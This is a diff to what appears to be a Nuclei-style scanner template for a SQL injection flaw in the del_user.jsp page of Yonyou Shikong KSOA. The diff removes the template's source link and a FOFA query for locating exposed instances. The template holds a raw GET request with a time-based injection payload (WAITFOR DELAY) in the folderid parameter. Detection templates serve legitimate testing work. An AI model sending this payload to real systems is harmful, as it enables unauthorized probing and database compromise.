@@ -3,12 +3,8 @@ info:
   name: 时空用友 del_user存在SQLl注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dgbpg60t12p6zihg'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: dgbpg60t12p6zihg
-    fofa: app="用友-时空KSOA"
 http:
 - raw:
   - 'GET /km/del_user.jsp?folderid=1%27%3bWAITFOR+DELAY+%270%3a0%3a5%27-- HTTP/1.1
